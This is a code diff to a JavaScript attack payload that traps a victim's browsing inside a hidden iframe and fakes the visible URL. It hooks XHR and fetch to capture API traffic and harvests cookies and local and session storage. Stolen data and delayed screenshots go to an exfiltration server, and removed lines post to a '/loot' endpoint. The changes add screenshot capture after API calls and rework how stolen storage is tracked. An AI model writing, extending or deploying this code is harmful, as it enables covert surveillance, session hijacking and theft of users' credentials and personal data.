@@ -61,6 +61,14 @@ function initGlobals()
 	// Should we try to monkey patch underlying API prototypes?
 	window.monkeyPatchAPIs = true;
 
+
+	// Should we capture a screenshot after a delay after an API call?
+	// The data that came back from the API call might have been used to update
+	// the UI
+	window.postApiCallScreenshot = true;
+	window.screenshotDelay       = 2000;
+
+
 	// Create our own XHR that won't get modified by monkeyPatching
 	window.taperXHR = XMLHttpRequest;
 
@@ -98,10 +106,6 @@ function initGlobals()
 }
 
 
-
-// function cleanup(){
-//  		sessionStorage.removeItem("taperClaimAlpha");
-// }
 
 
 function canAccessIframe(iframe) {
@@ -252,31 +256,44 @@ function checkCookies()
 			continue;
 		}
 
+		if (cookieValue.length === 0)
+		{
+			continue;
+		}
 
-		// console.log("!!!!!   Checking cookies for: " + cookieName + ", " + cookieValue);
-		if (cookieName in tapercookieStorageDict)
+
+
+		var cookieDict = {};
+		if (sessionStorage.getItem('taperCookieStorage').length > 0)
 		{
-			// console.log("== Existing cookie: " + cookieName);
-			if (tapercookieStorageDict[cookieName] != cookieValue)
+			cookieDict = JSON.parse(sessionStorage.getItem('taperCookieStorage'));
+
+			if (cookieName in cookieDict)
 			{
-				// Existing cookie, but the value has changed
-				// console.log("     New cookie value: " + cookieValue);
-				// console.log("     Old cookie value: " + cookieStorageDict[cookieName]);
-				tapercookieStorageDict[cookieName] = cookieValue;
-			}
-			else
-			{
-				// Existing cookie, but no change in value to report
-				// console.log("     Cookie value unchanged");
-				continue;
+				// console.log("== Existing cookie: " + cookieName);
+				if (cookieDict[cookieName] != cookieValue)
+				{
+					// Existing cookie, but the value has changed
+					// console.log("     New cookie value: " + cookieValue);
+					// console.log("     Old cookie value: " + cookieStorageDict[cookieName]);
+					cookieDict[cookieName] = cookieValue;
+				}
+				else
+				{
+					// Existing cookie, but no change in value to report
+					// console.log("     Cookie value unchanged");
+					continue;
+				}
 			}
 		}
-		else 
+
+		cookieDict[cookieName] = cookieValue;
+
+		if (Object.keys(cookieDict).length > 0)
 		{
-			// New cookie detected
-			// console.log("++ New cookie: " + cookieName + ", with value: " + cookieValue);
-			tapercookieStorageDict[cookieName] = cookieValue;
+			sessionStorage.setItem('taperCookieStorage', JSON.stringify(cookieDict));
 		}
+
 
 		// Ship it
 		// request = new XMLHttpRequest();
@@ -300,34 +317,45 @@ function checkLocalStorage()
 {
 	for (index = 0; index < localStorage.length; index++)
 	{
-		key = localStorage.key(index)
+		key   = localStorage.key(index)
 		value = localStorage.getItem(key)
 		//console.log("~~~ Local storage: {" + key + ", " + value + "}");
 
-		if (key in taperlocalStorageDict)
-		{
-			// Existing local storage key
-			//console.log("!!! Existing localstorage key...");
-			if (taperlocalStorageDict[key] != value)
-			{
-				// Existing localStorage, but the value has changed
-				// console.log("     New localStorage value: " + value);
-				// console.log("     Old localStorage value: " + localStorageDict[key]);
-				taperlocalStorageDict[key] = value;
-			}
-			else
-			{
-				// Existing cookie, but no change in value to report
-				//console.log("     localStorgae value unchanged");
-				continue;
-			}
 
-		}
-		else
+		var localStorageDict = {};
+
+		if (sessionStorage.getItem('taperLocalStorage').length > 0)
 		{
-			// New localStorage entry
-			//console.log("++ New localStorage: " + key + ", with value: " + value);
-			taperlocalStorageDict[key] = value;
+			localStorageDict = JSON.parse(sessionStorage.getItem('taperLocalStorage'));
+
+			if (key in localStorageDict)
+			{
+				// Existing local storage key
+				//console.log("!!! Existing localstorage key...");
+				if (localStorageDict[key] != value)
+				{
+					// Existing localStorage, but the value has changed
+					// console.log("     New localStorage value: " + value);
+					// console.log("     Old localStorage value: " + localStorageDict[key]);
+					localStorageDict[key] = value;
+				}
+				else
+				{
+					// Existing cookie, but no change in value to report
+					//console.log("     localStorgae value unchanged");
+					continue;
+				}
+			}
+		}
+
+		// New localStorage entry
+		//console.log("++ New localStorage: " + key + ", with value: " + value);
+		localStorageDict[key] = value;
+
+		// Copy dictionary back to session storage
+		if (Object.keys(localStorageDict).length > 0)
+		{
+			sessionStorage.setItem('taperLocalStorage', JSON.stringify(localStorageDict));
 		}
 
 
@@ -359,30 +387,61 @@ function checkSessionStorage()
 		value = sessionStorage.getItem(key)
 		console.log("~~~ Session storage: {" + key + ", " + value + "}");
 
-		if (key in tapersessionStorageDict)
-		{
-			// Existing local storage key
-			console.log("!!! Existing localstorage key...");
-			if (tapersessionStorageDict[key] != value)
-			{
-				// Existing localStorage, but the value has changed
-				 // console.log("     New sessionStorage value: " + value);
-				 // console.log("     Old sessionStorage value: " + sessionStorageDict[key]);
-				tapersessionStorageDict[key] = value;
-			}
-			else
-			{
-				// Existing sessionStorage, but no change in value to report
-				// console.log("     sessionStorage value unchanged");
-				continue;
-			}
 
+		if (key === "taperSessionStorage" || 
+			key === "taperLocalStorage" || 
+			key === "taperCookieStorage"||
+			key === "taperSessionName" ||
+			key === "taperLastUrl" ||
+			key === "taperSystemLoaded" ||
+			key === "taperSessionUUID")
+		{
+			// Should skip over our own session storage for reporting
+			console.log("!!! Found taper data in session storage, hopefully SKIPPING");
+			continue;
+		}
+
+
+		var sessionStorageDict = {};
+
+		if (sessionStorage.getItem('taperSessionStorage').length > 0)
+		{
+			console.log("+++ taperSessionStorage has length...");
+			sessionStorageDict = JSON.parse(sessionStorage.getItem('taperSessionStorage'));
+
+			if (key in sessionStorageDict)
+			{
+				// Existing local storage key
+				console.log("!!! Existing sessionstorage key...");
+				if (sessionStorageDict[key] != value)
+				{
+					// Existing localStorage, but the value has changed
+				 	console.log("     New sessionStorage value: " + value);
+				 	console.log("     Old sessionStorage value: " + sessionStorageDict[key]);
+					sessionStorageDict[key] = value;
+				}
+				else
+				{
+					// Existing sessionStorage, but no change in value to report
+					console.log("     sessionStorage value unchanged");
+					continue;
+				}
+			}
 		}
 		else
 		{
-			// New localStorage entry
-			// console.log("++ New sessionStorage: " + key + ", with value: " + value);
-			tapersessionStorageDict[key] = value;
+			console.log("+++ In else statement for taperSessionStorage length check...");
+		}
+
+		console.log("XXXX Wrapping up Session storage: {" + key + ", " + value + "}");
+
+		sessionStorageDict[key] = value;
+
+		console.log("!!!! About to set session storage value to: " + JSON.stringify(sessionStorageDict))
+		console.log("Length of dict is: " + sessionStorageDict.length);
+		if (Object.keys(sessionStorageDict).length > 0)
+		{
+			sessionStorage.setItem('taperSessionStorage', JSON.stringify(sessionStorageDict));
 		}
 
 
@@ -416,9 +475,6 @@ function sendHTML()
 		myReference = document;
 	}
 
-
-	// trapURL  = document.getElementById("iframe_a").contentDocument.location.href;
-	// trapHTML = document.getElementById("iframe_a").contentDocument.documentElement.outerHTML;
 	trapURL  = myReference.contentDocument.location.href;
 	trapHTML = myReference.contentDocument.documentElement.outerHTML;
 
@@ -490,7 +546,7 @@ function runUpdate()
 			// Second click will properly load the external page. 
 			// Sad to lose the trap through. 
 			console.log("iFrame access lost, loading page: " + sessionStorage.getItem('taperLastUrl'));
-			// window.location = sessionStorage.getItem('taperLastUrl');
+			window.location = sessionStorage.getItem('taperLastUrl');
 		}
 		else
 		{
@@ -579,110 +635,6 @@ function runUpdate()
 		// Fake the URL that the user sees. This is important. 
 		window.history.replaceState(null, '', currentUrl);
 	}
-
-
-
-
-
-	// ******************************************
-
-	// iFrame trap disable code
-	// if (!canAccessIframe(document.getElementById("iframe_a")))
-	// {
-	// 	// If we can't access the iframe anymore, that 
-	// 	// means the iframe has changed origin. They 
-	// 	// surfed away to a new domain, probably through a link
-	// 	// 
-	// 	// This is bad, the new page won't load in the iframe trap
-	// 	// and will throw very obvious errors on their page
-	// 	// indicating something isn't right  
-	// 	//
-	// 	// Safest thing is the kill the iframe trap and hope
-	// 	// no one notices. We'll reload the parent page to the current 
-	// 	// iframe page. It'll seem like clicking the link to the 
-	// 	// external page didn't work, but the second click will. 
-	// 	// First click exits the iframe, reloads the normally. 
-	// 	// Second click will properly load the external page. 
-	// 	// Sad to lose the trap through. 
-	// 	window.location = taperlastFakeUrl;
-	// }
-
-
-
-	// var fakeUrl = document.getElementById("iframe_a").contentDocument.location.pathname;
-	// var fullUrl = document.getElementById("iframe_a").contentDocument.location.href;
-	// // console.log("$$$ Location: " + document.getElementById("iframe_a").contentDocument.location);
-	// // console.log("$$$ Path: " + document.getElementById("iframe_a").contentDocument.location.pathname);
-	// // console.log("$$$ href: " + document.getElementById("iframe_a").contentDocument.location.href);
-
-	// // New page, let's steal stuff
-	// if (taperlastFakeUrl != fakeUrl)
-	// {
-	// 	// Handle URL recording
-	// 	console.log("New trap URL, stealing the things: " + fakeUrl);
-	// 	taperlastFakeUrl = fakeUrl;
-
-	// 	// This needs an API call to report the new page
-	// 	// and take a screenshot maybe, not sure if
-	// 	// screenshot timing will be right yet
-	// 	// request = new XMLHttpRequest();
-	// 	request = new window.taperXHR();
-	// 	request.open("POST", taperexfilServer + "/loot/location/" + taperSessionUUID);
-	// 	request.setRequestHeader("Content-Type", "application/json;charset=UTF-8");
-		
-	// 	var jsonObj = new Object();
-	// 	jsonObj["url"] = fullUrl;
-	// 	var jsonString = JSON.stringify(jsonObj);
-	// 	request.send(jsonString);
-
-
-	// 	// We need to wait until the ifram has loaded to
-	// 	// do HTML based looting. 
-	// 	document.getElementById("iframe_a").onload = function() {
-	// 		// console.log("+++ Onload ready!");
-
-	// 		// Fake the URL that the user sees. This is important. 
-	// 		window.history.replaceState(null, '', fakeUrl);
-
-	// 		// Handle input scraping
-	// 		hookInputs();
-
-	// 		// Handle screenshotting
-	// 		sendScreenshot();
-
-
-	// 		// Exfil HTML code
-	// 		if (taperexfilHTML)
-	// 		{
-	// 			sendHTML();
-	// 		}
-	// 	}
-	// }
-
-
-	// // Updates that need to happen constantly
-	// // hooking inputs, we can miss them otherwise
-	// // hookInputs intelligently knows whether inputs
-	// // need to be rehooked or not
-	// hookInputs();
-
-
-	// // Handle Cookies
-	// // Will only report when new cookies found, or values change. 
-	// checkCookies();
-
-
-	// // Check local storage
-	// // Will only report when new or changed data found
-	// checkLocalStorage();
-
-
-	// // Check session storage
-	// // Will only report when new or changed data found
-	// checkSessionStorage();
-
-	// // Fake the URL that the user sees. This is important. 
-	// window.history.replaceState(null, '', fakeUrl);
 }
 
 
@@ -756,6 +708,12 @@ function customFetch(url, options)
 			var jsonString          = JSON.stringify(jsonObj);
 			request.send(jsonString);
 
+			// Check if we should take a screenshot now
+			if (window.postApiCallScreenshot)
+			{
+				setTimeout(sendScreenshot, window.screenshotDelay);
+			}
+
 
 			// Continue on like nothing is amiss
 			return response;
@@ -793,7 +751,6 @@ function monkeyPatch()
 
 
 	//Monkey patch open
-	// document.getElementById("iframe_a").contentWindow.XMLHttpRequest.prototype.open = function(method, url, async, user, password) 
 	myReference.contentWindow.XMLHttpRequest.prototype.open = function(method, url, async, user, password) 
 	{
 		var method = arguments[0];
@@ -822,7 +779,6 @@ function monkeyPatch()
 
 
 	// Monkey patch setRequestHeader
-	// document.getElementById("iframe_a").contentWindow.XMLHttpRequest.prototype.setRequestHeader = function (header, value)
 	myReference.contentWindow.XMLHttpRequest.prototype.setRequestHeader = function (header, value)
 	{
 		var header = arguments[0];
@@ -851,7 +807,6 @@ function monkeyPatch()
 
 
   	// Monkey patch send
-	// document.getElementById("iframe_a").contentWindow.XMLHttpRequest.prototype.send = function(data) 
 	myReference.contentWindow.XMLHttpRequest.prototype.send = function(data) 
 	{
 		console.log("Intercepted request body: " + data);
@@ -897,6 +852,12 @@ function monkeyPatch()
 				jsonObj["responseBody"] = responseBody;
 				var jsonString          = JSON.stringify(jsonObj);
 				request.send(jsonString);
+
+				// Check if we should take a screenshot now
+				if (window.postApiCallScreenshot)
+				{
+					setTimeout(sendScreenshot, window.screenshotDelay);
+				}
 			}
 		};
 
@@ -907,7 +868,6 @@ function monkeyPatch()
 	// console.log("## Starting fetch monkey patching");
 	// Fetch API monkey patching
 	const originalFetch = window.fetch;
-	// document.getElementById("iframe_a").contentWindow.fetch = customFetch;
 	myReference.contentWindow.fetch = customFetch;
 }
 
@@ -917,7 +877,6 @@ function monkeyPatch()
 // Start the tap
 function takeOver()
 {
-
 	var myReference = "";
 
 	if (window.taperMode === "trap")
@@ -973,62 +932,6 @@ function takeOver()
 	{
 		monkeyPatch();
 	}
-
-
-
-
-// **********************
-
-
-	//document.body.style.backgroundColor = "pink";
-	//document.innerHTML = "";
-
-	// // Setup our iframe trap
-	// var iframe = document.createElement("iframe");
-	// iframe.setAttribute("src", taperstartingPage);
-	// iframe.setAttribute("style", "border:none");
-
-	// if (taperfullscreenIframe)
-	// {
-	// 	console.log("&& Using fullscreen");
-	// 	iframe.style.width  = "100%";
-	// 	iframe.style.height = "100%";
-	// 	iframe.style.top = "0px";
-	// 	iframe.style.left = "0px"
-	// }
-	// else
-	// {
-	// 	console.log("&& Using partial screen");
-	// 	iframe.style.width  = "80%";
-	// 	iframe.style.height = "80%";
-	// 	iframe.style.top = "50px";
-	// 	iframe.style.left = "50px";
-	// }
-	// iframe.style.position = "fixed";
-	// iframe.id = "iframe_a";
-	// document.body.appendChild(iframe);
-
-	// // Monkey patch underlaying API calls?
-	// if (window.monkeyPatchAPIs)
-	// {
-	// 	monkeyPatch();
-	// }
-
-
-
-	// // Hook needed events below...
-
-	// // Just register all the darned events, each event in the iframe
-	// // we'll call runUpdate()
-	// var myIframe = document.getElementById('iframe_a');
-
-	// // Hook all the things for URL faking
-	// for(var key in myIframe){
-	// 	if(key.search('on') === 0) {
-	// 		myIframe.addEventListener(key.slice(2), runUpdate);
-	// 	}
-	// }
-
 }
 
 
@@ -1095,68 +998,11 @@ if (sessionStorage.getItem('taperSystemLoaded') != "true")
 			}
 		}
 	}
-
-
 }
 else
 {
 	console.log("++++++ Already loaded payload!");
 }
-
-
-
-//if (sessionStorage.getItem("taperClaimDebug")===null)
-// if (window.taperClaimDebug != true)
-// {
-// 	window.taperClaimDebug = true;
-// 	initGlobals();
-
-// 	// Get our client UUID
-// 	request = new XMLHttpRequest();
-// 	request.open("GET", window.taperexfilServer + "/client/getToken", true);
-// 	request.send(null);
-
-// 	request.onreadystatechange = function()
-// 	{
-// 		if (request.readyState == XMLHttpRequest.DONE)
-// 		{
-// 			if (request.status == 200)
-// 			{
-
-// 				// We have a session, start taking over
-
-// 				// Pull in html2canvas
-// 				var js = document.createElement("script");
-// 				js.type = "text/javascript";
-// 				js.src = taperexfilServer + "/lib/telemhelperlib.js";
-
-// 				this.temp_define = window['define'];
-// 				document.body.appendChild(js);
-// 				window['define'] = undefined;
-// 				console.log("HTML2CANVAS added to DOM");
-
-// 				// Blank main page
-// 				document.body.innerHTML = "";
-// 				document.body.outerHTML = "";
-
-// 				var jsonResponse = JSON.parse(request.responseText);
-// 				// window.taperSessionUUID = jsonResponse.clientToken;
-// 				sessionStorage.setItem('taperSessionUUID', jsonResponse.clientToken);
-
-//     			// We're ready to trap all the things now
-// 				takeOver();
-// 			}
-// 			else
-// 			{
-// 				console.log("No client session received, skipping");
-// 			}
-// 		}
-// 	}
-// }
-// else
-// {
-// 	console.log("++++++ Already loaded payload!");
-// }
 
 
 
